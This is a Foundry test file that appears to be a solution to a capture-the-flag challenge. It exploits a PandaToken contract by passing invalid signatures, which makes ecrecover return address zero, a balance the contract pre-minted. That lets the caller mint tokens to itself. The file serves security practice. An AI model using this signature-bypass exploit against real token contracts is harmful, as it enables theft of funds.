// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "../src/PandaToken.sol";

contract Hack is Test {
    PandaToken pandatoken;
    address owner = vm.addr(1);
    address hacker = vm.addr(2);

    function setUp() external {
        vm.prank(owner);
        pandatoken = new PandaToken(400, "PandaToken", "PND");
    }

    function test() public {
        vm.startPrank(hacker);
        bytes32 hash = keccak256(abi.encode(hacker, 1 ether));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(1, hash);

        // your goal - to have 3 tokens (3e18) on your own(hacker) balance.
        // solution
        // It seems constructor mint 10 eth token for address 0 in constructor,
        // any invalid ecrecover will return address 0, the balance check will go trough and will mint to msg.sender
        bytes memory signature = "anything";
        pandatoken.getTokens(1 ether, signature);
        signature = "will";
        pandatoken.getTokens(1 ether, signature);
        signature = "work";
        pandatoken.getTokens(1 ether, signature);

        assertEq(pandatoken.balanceOf(hacker), 3 ether);
    }
}
